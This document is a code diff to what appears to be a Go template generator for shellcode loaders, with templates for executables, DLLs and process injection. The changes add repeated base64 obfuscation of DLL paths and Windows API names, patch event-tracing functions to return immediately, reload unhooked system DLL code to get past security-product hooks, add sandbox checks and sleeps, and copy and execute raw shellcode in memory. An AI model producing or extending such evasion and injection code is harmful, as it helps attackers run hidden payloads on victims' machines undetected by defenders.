@@ -275,7 +275,7 @@ func DLL_Refresher() string {
 		"debug/pe"
 		"encoding/base64"
 		"encoding/hex"
-		"loader/loader"
+		"[loader]/[loader]"
 		"os"
 		"io/ioutil"
 		"strconv"
@@ -290,6 +290,7 @@ func DLL_Refresher() string {
 	var  (
 		{{.Variables.customsyscall}} uint16
 		{{.Variables.customsyscallVP}} uint16
+		{{.Variables.number}} int = {{.Variables.b64number}}
 	)
 
 	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
@@ -315,16 +316,29 @@ func DLL_Refresher() string {
 	
 		
 	func {{.Variables.loader}}()  {
-		err := {{.Variables.Reloading}}("C:\\Windows\\System32\\kernel32.dll")
+		err := {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernel32}}"))
 		if err != nil {
 		}
-		err = {{.Variables.Reloading}}("C:\\Windows\\System32\\kernelbase.dll")
+		err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernelbase}}"))
 		if err != nil {
 		}
-		err = {{.Variables.Reloading}}("C:\\Windows\\System32\\ntdll.dll")
+		err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.ntdll}}"))
 		if err != nil {
 		}
+	
+	}
+	
 
+	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+		var {{.Variables.decoded}} []byte
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+		{{.Variables.sum}} := 1
+		for i := 1; i < {{.Variables.number}}; i++ {
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+			{{.Variables.sum}} += i
+		}
+		return string({{.Variables.decoded}})
+	
 	}
 
 	{{.Variables.ETW_Function}}
@@ -338,6 +352,7 @@ func DLL_Refresher() string {
 	//export Start
 	func Start() {
 		{{.Variables.Sandbox}}
+		{{.Variables.ETW}}
 		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
 		if {{.Variables.Version}} == "10.0" {
 			{{.Variables.loader}}()
@@ -377,25 +392,40 @@ func DLL_Refresher() string {
 		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
 		{{.Variables.protect}} = 0x40
 		{{.Variables.alloctype}} = 0x3000
-		{{.Variables.ptr}} := loader.Allocate({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
+		{{.Variables.ptr}} := [loader].[Allocate]({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
 		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
 		for x, y := range []byte({{.Variables.raw_bin}}) {
 			{{.Variables.buff}} [x] = y
 		}
+
+		var {{.Variables.oldfartcodeperms}} uintptr
+
+		{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
+			{{.Variables.customsyscallVP}}, 
+			uintptr({{.Variables.phandle}}),
+			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
+			&{{.Variables.regionsize}},
+			syscall.PAGE_EXECUTE_READ,
+			&{{.Variables.oldfartcodeperms}},
+		)
+		if {{.Variables.runfunc}} != 0 {
+		}
+
+
 		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0)
 	}
-	func {{.Variables.Reloading}}(name string) error {
-		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile(name)
+	func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
+		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
 			return {{.Variables.error}}
 		}
-		{{.Variables.file}}, {{.Variables.error}} := pe.Open(name)
+		{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
 			return {{.Variables.error}}
 		}
 		{{.Variables.x}} := {{.Variables.file}}.Section(".text")
 		{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
-		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL(name)
+		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
 			return {{.Variables.error}}
 		}
@@ -405,7 +435,7 @@ func DLL_Refresher() string {
 		var {{.Variables.oldfartcodeperms}} uintptr
 		{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
 		{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
-		{{.Variables.runfunc}}, _ := NtProtectVirtualMemory(
+		{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
 			{{.Variables.customsyscallVP}}, 
 			{{.Variables.handlez}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
@@ -414,7 +444,6 @@ func DLL_Refresher() string {
 			&{{.Variables.oldfartcodeperms}},
 		)
 		if {{.Variables.runfunc}} != 0 {
-			panic("Call to VirtualProtect failed!")
 		}
 
 		for i := 0; i < len({{.Variables.bytes}}); i++ {
@@ -423,7 +452,7 @@ func DLL_Refresher() string {
 			(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
 		}
 
-		{{.Variables.runfunc}}, _ = NtProtectVirtualMemory(
+		{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
 			{{.Variables.customsyscallVP}}, 
 			{{.Variables.handlez}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
@@ -432,14 +461,13 @@ func DLL_Refresher() string {
 			&{{.Variables.oldfartcodeperms}},
 		)
 		if {{.Variables.runfunc}} != 0 {
-			panic("Call to VirtualProtect failed!!")
 		}
 
 		return nil
 	}
-	func NtProtectVirtualMemory({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
+	func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
 
-		return loader.NtProtectVirtualMemory(
+		return [loader].[NtProtectVirtualMemory](
 			{{.Variables.sysid}},
 			{{.Variables.processHandle}},
 			uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
@@ -458,16 +486,17 @@ func Binary() string {
 	return `
 	package main
 
+	import "C"
+
 	import (
 		"crypto/aes"
 		"crypto/cipher"
 		"debug/pe"
 		"encoding/base64"
 		"encoding/hex"
-		"fmt"
-		"loader/loader"
+		"time"
+		"[loader]/[loader]"
 		{{.Variables.DebugImport}}
-		"os"
 		"io/ioutil"
 		"syscall"
 		"unsafe"
@@ -491,6 +520,7 @@ func Binary() string {
 	var (
 		{{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
 		{{.Variables.customsyscall}} uint16
+		{{.Variables.number}} int = {{.Variables.b64number}}
 	)
 
 
@@ -504,8 +534,8 @@ func Binary() string {
 	
 
 	func {{.Variables.Console}}(show bool) {
-		{{.Variables.getWin}} := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
-		{{.Variables.showWin}} := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
+		{{.Variables.getWin}} := syscall.NewLazyDLL("kernel32.dll").NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
+		{{.Variables.showWin}} := syscall.NewLazyDLL("user32.dll").NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
 		{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
 		if {{.Variables.hwnd}} == 0 {
 				return
@@ -546,31 +576,45 @@ func Binary() string {
 	}
 	
 	func {{.Variables.loader}}()  {
-		err := {{.Variables.Reloading}}("C:\\Windows\\System32\\kernel32.dll")
+		err := {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernel32}}"))
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
-		err = {{.Variables.Reloading}}("C:\\Windows\\System32\\kernelbase.dll")
+		err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernelbase}}"))
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
-		err = {{.Variables.Reloading}}("C:\\Windows\\System32\\ntdll.dll")
+		err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.ntdll}}"))
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
 		{{.Variables.EDR}}
+	
+	}
+	
 
+	func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+		var {{.Variables.decoded}} []byte
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+		{{.Variables.sum}} := 1
+		for i := 1; i < {{.Variables.number}}; i++ {
+			{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+			{{.Variables.sum}} += i
+		}
+		return string({{.Variables.decoded}})
+	
 	}
 	
 	func main() {
 		{{.Variables.Sandbox}}
-		{{.Variables.hide}}
+		{{.Variables.ETW}}
+		time.Sleep({{.Variables.SleepSecond}} * time.Millisecond)
 		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
 		if {{.Variables.Version}} == "10.0" {
 			{{.Variables.loader}}()
 		}
 		{{.Variables.ETW}}
-
+		{{.Variables.hide}}
 		{{.Variables.Pointer}}
 		{{.Variables.ptr}} := func() {
 		}
@@ -603,7 +647,7 @@ func Binary() string {
 		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
 		{{.Variables.regionsize}} := uintptr(len({{.Variables.raw_bin}}))
 	
-		{{.Variables.runfunc}}, _ := NtProtectVirtualMemory(
+		{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
 			{{.Variables.customsyscall}}, 
 			{{.Variables.handle}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
@@ -612,20 +656,17 @@ func Binary() string {
 			&{{.Variables.oldptrperms}},
 		)
 		if {{.Variables.runfunc}} != 0 {
-			panic("Call to VirtualProtect failed!")
 		}
 		{{.Variables.CopyPointer}}
 
 		*(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})) = (*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}))
 
 		{{.Variables.OverwrittenShellcode}}
-		os.Stdout, _ = os.Open(os.DevNull)
-		fmt.Println(len({{.Variables.raw_bin}}))
 		var {{.Variables.oldfartcodeperms}} uintptr
 	
 		{{.Variables.OverWrittenPoint}}
 
-		{{.Variables.runfunc}}, _ = NtProtectVirtualMemory(
+		{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
 			{{.Variables.customsyscall}}, 
 			{{.Variables.handle}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}})),
@@ -634,26 +675,24 @@ func Binary() string {
 			&{{.Variables.oldfartcodeperms}},
 		)
 		if {{.Variables.runfunc}} != 0 {
-			panic("Call to VirtualProtect failed!")
 		}
 
-		syscall.Syscall(uintptr(unsafe.Pointer(&{{.Variables.raw_bin}}[0])),0, 0, 0, 0,)
-
+		syscall.Syscall(**(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),0, 0, 0, 0,)
 	
 	}
-	func {{.Variables.Reloading}}(name string) error {
+	func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
 		{{.Variables.ReloadingMessage}}
-		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile(name)
+		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
 			return {{.Variables.error}}
 		}
-		{{.Variables.file}}, {{.Variables.error}} := pe.Open(name)
+		{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
 			return {{.Variables.error}}
 		}
 		{{.Variables.x}} := {{.Variables.file}}.Section(".text")
 		{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
-		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL(name)
+		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
 		if {{.Variables.error}} != nil {
 			return {{.Variables.error}}
 		}
@@ -663,7 +702,7 @@ func Binary() string {
 		var {{.Variables.oldfartcodeperms}} uintptr
 		{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
 		{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
-		{{.Variables.runfunc}}, _ := NtProtectVirtualMemory(
+		{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
 			{{.Variables.customsyscall}}, 
 			{{.Variables.handlez}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
@@ -672,7 +711,6 @@ func Binary() string {
 			&{{.Variables.oldfartcodeperms}},
 		)
 		if {{.Variables.runfunc}} != 0 {
-			panic("Call to VirtualProtect failed!")
 		}
 
 
@@ -682,7 +720,7 @@ func Binary() string {
 			(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
 		}
 
-		{{.Variables.runfunc}}, _ = NtProtectVirtualMemory(
+		{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
 			{{.Variables.customsyscall}}, 
 			{{.Variables.handlez}},
 			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
@@ -691,14 +729,13 @@ func Binary() string {
 			&{{.Variables.oldfartcodeperms}},
 		)
 		if {{.Variables.runfunc}} != 0 {
-			panic("Call to VirtualProtect failed!!")
 		}
 
 		return nil
 	}
-	func NtProtectVirtualMemory({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
+	func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
 
-		return loader.NtProtectVirtualMemory(
+		return [loader].[NtProtectVirtualMemory](
 			{{.Variables.sysid}},
 			{{.Variables.processHandle}},
 			uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
@@ -722,7 +759,7 @@ func DLL() string {
 		"crypto/cipher"
 		"encoding/base64"
 		"encoding/hex"
-		"loader/loader"
+		"[loader]/[loader]"
 		"os"
 		"strconv"
 		"syscall"
@@ -802,7 +839,7 @@ func DLL() string {
 		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
 		{{.Variables.protect}} = 0x40
 		{{.Variables.alloctype}} = 0x3000
-		{{.Variables.ptr}} := loader.Allocate({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
+		{{.Variables.ptr}} := [loader].[Allocate]({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
 		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
 		for x, y := range []byte({{.Variables.raw_bin}}) {
 			{{.Variables.buff}} [x] = y
@@ -865,10 +902,12 @@ func WindowsVersion_Binary() string {
 
 func ETW_Function() string {
 	return `
-	var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")
-	var {{.Variables.procEtwNotificationRegister}} = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwNotificationRegister")
-	var {{.Variables.procEtwEventRegister}} = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventRegister")
-	var {{.Variables.procEtwEventWriteFull}} = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteFull")
+	var {{.Variables.procWriteProcessMemory}} = syscall.NewLazyDLL("kernel32.dll").NewProc({{.Variables.decode}}("{{.Variables.WriteProcessMemoryName}}"))
+	var {{.Variables.procEtwNotificationRegister}} = syscall.NewLazyDLL("ntdll.dll").NewProc({{.Variables.decode}}("{{.Variables.EtwNotificationRegisterName}}"))
+	var {{.Variables.procEtwEventRegister}} = syscall.NewLazyDLL("ntdll.dll").NewProc({{.Variables.decode}}("{{.Variables.EtwEventRegisterName}}"))
+	var {{.Variables.procEtwEventWriteFull}} = syscall.NewLazyDLL("ntdll.dll").NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteFullName}}"))
+	var {{.Variables.procEtwEventWrite}} = syscall.NewLazyDLL("ntdll.dll").NewProc({{.Variables.decode}}("{{.Variables.EtwEventWriteName}}"))
+
 	
 	var (
 		errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
@@ -904,7 +943,7 @@ func ETW_Function() string {
 
 	func {{.Variables.ETW}}() {
 		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
-		{{.Variables.dataAddr}} := []uintptr{ {{.Variables.procEtwNotificationRegister}}.Addr(), {{.Variables.procEtwEventRegister}}.Addr(), {{.Variables.procEtwEventWriteFull}}.Addr()}
+		{{.Variables.dataAddr}} := []uintptr{ {{.Variables.procEtwNotificationRegister}}.Addr(), {{.Variables.procEtwEventRegister}}.Addr(), {{.Variables.procEtwEventWriteFull}}.Addr(), {{.Variables.procEtwEventWrite}}.Addr()}
 		for i, _ := range {{.Variables.dataAddr}} {
 			{{.Variables.data}}, _ := hex.DecodeString("4833C0C3")
 			var {{.Variables.nLength}} uintptr
@@ -930,7 +969,7 @@ func Procces_Injection_DLL() string {
 		"encoding/base64"
 		"encoding/hex"
 		"fmt"
-		"loader/loader"
+		"[loader]/[loader]"
 		"io/ioutil"
 		"syscall"
 		"time"
@@ -954,6 +993,7 @@ var (
 	{{.Variables.customsyscall}} uint16
 	{{.Variables.customsyscallVP}} uint16
 	{{.Variables.Version}} string
+	{{.Variables.number}} int = {{.Variables.b64number}}
 )
 
 func errnoErr(e syscall.Errno) error {
@@ -1144,17 +1184,28 @@ func {{.Variables.Versionfunc}}() string {
 		{{.Variables.SyscallNumberlist}}
 
 }
+func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+	var {{.Variables.decoded}} []byte
+		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+	{{.Variables.sum}} := 1
+	for i := 1; i < {{.Variables.number}}; i++ {
+		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+		{{.Variables.sum}} += i
+	}
+	return string({{.Variables.decoded}})
+
+}
 
 {{.Variables.ETW_Function}}
 
 func {{.Variables.loader}}()  {
-	err := {{.Variables.Reloading}}("C:\\Windows\\System32\\kernel32.dll")
+	err := {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernel32}}"))
 	if err != nil {
 	}
-	err = {{.Variables.Reloading}}("C:\\Windows\\System32\\kernelbase.dll")
+	err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernelbase}}"))
 	if err != nil {
 	}
-	err = {{.Variables.Reloading}}("C:\\Windows\\System32\\ntdll.dll")
+	err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.ntdll}}"))
 	if err != nil {
 	}
 }
@@ -1218,6 +1269,7 @@ func main() {
 //export Start
 func Start() {
 	{{.Variables.Sandbox}}
+	{{.Variables.ETW}}
 	{{.Variables.Version}} = {{.Variables.Versionfunc}}()
 	if {{.Variables.Version}} == "10.0" {
 		{{.Variables.loader}}()
@@ -1276,18 +1328,18 @@ func {{.Variables.RemoteModuleReloading}}({{.Variables.name}} string, {{.Variabl
 
 
 
-func {{.Variables.Reloading}}(name string) error {
-	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile(name)
+func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
+	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
 	if {{.Variables.error}} != nil {
 		return {{.Variables.error}}
 	}
-	{{.Variables.file}}, {{.Variables.error}} := pe.Open(name)
+	{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}})
 	if {{.Variables.error}} != nil {
 		return {{.Variables.error}}
 	}
 	{{.Variables.x}} := {{.Variables.file}}.Section(".text")
 	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
-	{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL(name)
+	{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
 	if {{.Variables.error}} != nil {
 		return {{.Variables.error}}
 	}
@@ -1297,7 +1349,7 @@ func {{.Variables.Reloading}}(name string) error {
 	var {{.Variables.oldfartcodeperms}} uintptr
 	{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
 	{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
-	{{.Variables.runfunc}}, _ := NtProtectVirtualMemory(
+	{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
 		{{.Variables.customsyscallVP}}, 
 		{{.Variables.handlez}},
 		(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
@@ -1306,7 +1358,6 @@ func {{.Variables.Reloading}}(name string) error {
 		&{{.Variables.oldfartcodeperms}},
 	)
 	if {{.Variables.runfunc}} != 0 {
-		panic("Call to VirtualProtect failed!")
 	}
 
 
@@ -1316,7 +1367,7 @@ func {{.Variables.Reloading}}(name string) error {
 		(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
 	}
 
-	{{.Variables.runfunc}}, _ = NtProtectVirtualMemory(
+	{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
 		{{.Variables.customsyscallVP}}, 
 		{{.Variables.handlez}},
 		(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
@@ -1325,14 +1376,13 @@ func {{.Variables.Reloading}}(name string) error {
 		&{{.Variables.oldfartcodeperms}},
 	)
 	if {{.Variables.runfunc}} != 0 {
-		panic("Call to VirtualProtect failed!!")
 	}
 
 	return nil
 }
-func NtProtectVirtualMemory({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
+func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
 
-	return loader.NtProtectVirtualMemory(
+	return [loader].[NtProtectVirtualMemory](
 		{{.Variables.sysid}},
 		{{.Variables.processHandle}},
 		uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
@@ -1349,6 +1399,8 @@ func NtProtectVirtualMemory({{.Variables.sysid}} uint16, {{.Variables.processHan
 func Procces_Injection() string {
 	return `
 	package main
+	
+	import "C"
 
 	import (
 
@@ -1358,7 +1410,7 @@ func Procces_Injection() string {
 		"encoding/base64"
 		"encoding/hex"
 		"fmt"
-		"loader/loader"
+		"[loader]/[loader]"
 		{{.Variables.DebugImport}}
 		"io/ioutil"
 		"syscall"
@@ -1381,6 +1433,7 @@ const (
 var (
 	{{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
 	{{.Variables.customsyscall}} uint16
+	{{.Variables.number}} int = {{.Variables.b64number}}
 )
 
 func errnoErr(e syscall.Errno) error {
@@ -1593,18 +1646,31 @@ func {{.Variables.Versionfunc}}() string {
 
 }
 
+
+func {{.Variables.decode}}({{.Variables.b64}} string,) string {
+	var {{.Variables.decoded}} []byte
+		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString({{.Variables.b64}})
+	{{.Variables.sum}} := 1
+	for i := 1; i < {{.Variables.number}}; i++ {
+		{{.Variables.decoded}}, _ = base64.StdEncoding.DecodeString(string({{.Variables.decoded}}))
+		{{.Variables.sum}} += i
+	}
+	return string({{.Variables.decoded}})
+
+}
+
 {{.Variables.ETW_Function}}
 
 func {{.Variables.loader}}()  {
-	err := {{.Variables.Reloading}}("C:\\Windows\\System32\\kernel32.dll")
+	err := {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernel32}}"))
 	if err != nil {
 		{{.Variables.RefreshPE}}
 	}
-	err = {{.Variables.Reloading}}("C:\\Windows\\System32\\kernelbase.dll")
+	err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.kernelbase}}"))
 	if err != nil {
 		{{.Variables.RefreshPE}}
 	}
-	err = {{.Variables.Reloading}}("C:\\Windows\\System32\\ntdll.dll")
+	err = {{.Variables.Reloading}}({{.Variables.decode}}("{{.Variables.ntdll}}"))
 	if err != nil {
 		{{.Variables.RefreshPE}}
 	}
@@ -1674,6 +1740,7 @@ func {{.Variables.ReloadRemoteProcess}}({{.Variables.raw_bin}} []byte) {
 
 func main() {
 	{{.Variables.Sandbox}}
+	{{.Variables.ETW}}
 	{{.Variables.hide}}
 	{{.Variables.Version}} := {{.Variables.Versionfunc}}()
 	if {{.Variables.Version}} == "10.0" {
@@ -1733,19 +1800,19 @@ func {{.Variables.RemoteModuleReloading}}({{.Variables.name}} string, {{.Variabl
 
 
 
-func {{.Variables.Reloading}}(name string) error {
+func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
 	{{.Variables.ReloadingMessage}}
-	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile(name)
+	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
 	if {{.Variables.error}} != nil {
 		return {{.Variables.error}}
 	}
-	{{.Variables.file}}, {{.Variables.error}} := pe.Open(name)
+	{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}})
 	if {{.Variables.error}} != nil {
 		return {{.Variables.error}}
 	}
 	{{.Variables.x}} := {{.Variables.file}}.Section(".text")
 	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
-	{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL(name)
+	{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
 	if {{.Variables.error}} != nil {
 		return {{.Variables.error}}
 	}
@@ -1755,7 +1822,7 @@ func {{.Variables.Reloading}}(name string) error {
 	var {{.Variables.oldfartcodeperms}} uintptr
 	{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
 	{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
-	{{.Variables.runfunc}}, _ := NtProtectVirtualMemory(
+	{{.Variables.runfunc}}, _ := [NtProtectVirtualMemory](
 		{{.Variables.customsyscall}}, 
 		{{.Variables.handlez}},
 		(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
@@ -1764,7 +1831,7 @@ func {{.Variables.Reloading}}(name string) error {
 		&{{.Variables.oldfartcodeperms}},
 	)
 	if {{.Variables.runfunc}} != 0 {
-		panic("Call to VirtualProtect failed!")
+
 	}
 
 
@@ -1774,7 +1841,7 @@ func {{.Variables.Reloading}}(name string) error {
 		(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
 	}
 
-	{{.Variables.runfunc}}, _ = NtProtectVirtualMemory(
+	{{.Variables.runfunc}}, _ = [NtProtectVirtualMemory](
 		{{.Variables.customsyscall}}, 
 		{{.Variables.handlez}},
 		(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
@@ -1783,14 +1850,13 @@ func {{.Variables.Reloading}}(name string) error {
 		&{{.Variables.oldfartcodeperms}},
 	)
 	if {{.Variables.runfunc}} != 0 {
-		panic("Call to VirtualProtect failed!!")
 	}
 
 	return nil
 }
-func NtProtectVirtualMemory({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
+func [NtProtectVirtualMemory]({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {
 
-	return loader.NtProtectVirtualMemory(
+	return [loader].[NtProtectVirtualMemory](
 		{{.Variables.sysid}},
 		{{.Variables.processHandle}},
 		uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
